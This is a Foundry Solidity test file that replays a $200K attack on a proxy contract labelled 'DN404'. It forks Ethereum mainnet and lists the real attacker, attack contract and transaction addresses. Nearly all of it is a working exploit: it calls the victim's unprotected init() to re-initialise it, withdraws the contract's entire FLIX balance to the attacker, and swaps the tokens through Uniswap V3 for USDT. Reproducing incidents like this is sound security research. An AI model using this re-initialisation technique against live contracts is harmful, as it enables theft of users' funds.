// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.15;

import "forge-std/Test.sol";
import "../interface.sol";

// @KeyInfo - Total Lost : 200K
// Attacker : https://etherscan.io/address/0xd215ffaf0f85fb6f93f11e49bd6175ad58af0dfd
// Attack Contract : https://etherscan.io/address/0xd129d8c12f0e7aa51157d9e6cc3f7ece2dc84ecd
// Vulnerable Contract : https://etherscan.io/address/0x2c7112245fc4af701ebf90399264a7e89205dad4
// Attack Tx : https://etherscan.io/tx/0xbeef09ee9d694d2b24f3f367568cc6ba1dad591ea9f969c36e5b181fd301be82

// @Info
// Vulnerable Contract Code : https://etherscan.io/address/0x2c7112245fc4af701ebf90399264a7e89205dad4#code

// @Analysis
// Post-mortem : 
// Twitter Guy : 
// Hacking God : 

interface IProxy {
    function init(
        IERC20 initToken,
        uint256 initPeriods,
        uint256 initInterval
    ) external;

    function withdraw(
        IERC20 otherToken,
        uint256 amount,
        address receiver
    ) external;
}

contract DN404 is Test {
    uint256 constant blockNumber = 19_196_685;
    address constant victim = 0x2c7112245Fc4af701EBf90399264a7e89205Dad4;
    address constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address constant FLIX = 0x83Cb9449b7077947a13Bf32025A8eAA3Fb1D8A5e;
    address constant USDT = 0xdAC17F958D2ee523a2206206994597C13D831ec7;
    address constant UniV3Pair = 0xa7434b755852F2555D6F96B9E28bAfE92F08Df97;

    function setUp() public {
        vm.label(victim, "Proxy");
        vm.label(WETH, "WETH");
        vm.label(FLIX, "FLIX");
        vm.label(USDT, "USDT");
        vm.label(UniV3Pair, "Uniswap V3 Pair");
        vm.createSelectFork("mainnet", blockNumber);
    }

    function testExploit() public {
        // Implement exploit code here
        emit log_named_decimal_uint(" Attacker USDT Balance Before exploit", IERC20(USDT).balanceOf(address(this)), 6);
        
        uint256 initPeriods = 1;
        uint256 initInterval = 1_000_000_000_000_000_000;
        uint256 amount = IERC20(FLIX).balanceOf(address(victim));

        IProxy(victim).init(IERC20(WETH), initPeriods, initInterval);
        IProxy(victim).withdraw(IERC20(FLIX), amount, address(this));
        Uni_Pair_V3(UniV3Pair).swap(address(this), true, 685_000_000_000_000_000_000_000, 4_295_128_740, "");
        // Log balances after exploit
        emit log_named_decimal_uint(" Attacker USDT Balance After exploit", IERC20(USDT).balanceOf(address(this)), 6);
    }

      function uniswapV3SwapCallback(
        int256 amount0Delta,
        int256,
        bytes memory
    ) external {
        IERC20(FLIX).transfer(msg.sender, uint256(amount0Delta));
    }

    receive() external payable {}
}
